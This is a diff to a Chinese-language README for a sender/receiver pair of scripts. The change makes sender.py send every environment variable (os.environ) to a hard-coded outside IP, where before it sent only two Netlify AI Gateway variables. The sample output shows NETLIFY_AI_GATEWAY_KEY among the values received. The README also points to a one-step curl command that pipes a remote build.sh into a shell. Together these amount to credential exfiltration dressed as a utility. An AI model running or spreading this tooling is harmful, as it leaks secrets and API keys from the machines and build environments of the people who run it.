@@ -2,7 +2,7 @@
 
 一个最小可用示例：
 - `receiver.py`：HTTP 接口接收端，接收环境变量 JSON
-- `sender.py`：读取指定环境变量并发送到接口
+- `sender.py`：读取全部环境变量并发送到接口
 
 ## 1. 启动接收端
 
@@ -12,7 +12,7 @@ python receiver.py --host 0.0.0.0 --port 8080
 
 `receiver.py` 默认接口地址：`http://127.0.0.1:8080/env`
 
-## 2. 发送默认环境变量
+## 2. 发送全部环境变量
 
 ```bash
 python sender.py
@@ -27,13 +27,7 @@ python sender.py
 http://111.91.22.47:9001/env
 ```
 
-`sender.py` 里默认写死的环境变量列表是：
-
-```python
-DEFAULT_ENV_KEYS = ["NETLIFY_AI_GATEWAY_BASE_URL", "NETLIFY_AI_GATEWAY_KEY"]
-```
-
-如果你要改默认发送项，直接修改这个常量即可。
+`sender.py` 会默认发送当前进程可见的全部环境变量（`os.environ`）。
 
 ## 2.1 一键调用 build（无需 clone 仓库）
 
@@ -63,8 +57,12 @@ curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh 
 {
   "hostname": "MY-PC",
   "sent_at": "2026-05-02T03:00:00.000000+00:00",
-  "env_vars": {},
-  "missing_keys": ["NETLIFY_AI_GATEWAY_BASE_URL", "NETLIFY_AI_GATEWAY_KEY"]
+  "env_vars": {
+    "PATH": "...",
+    "HOME": "...",
+    "NETLIFY_AI_GATEWAY_KEY": "..."
+  },
+  "missing_keys": []
 }
 ```
 
@@ -74,9 +72,9 @@ curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh 
 {
   "status": "ok",
   "received_at": "2026-05-02T03:00:01.000000+00:00",
-  "received_keys": [],
-  "received_count": 0,
-  "missing_keys": ["NETLIFY_AI_GATEWAY_BASE_URL", "NETLIFY_AI_GATEWAY_KEY"],
+  "received_keys": ["HOME", "NETLIFY_AI_GATEWAY_KEY", "PATH"],
+  "received_count": 3,
+  "missing_keys": [],
   "source": {
     "hostname": "MY-PC",
     "sent_at": "2026-05-02T03:00:00.000000+00:00"
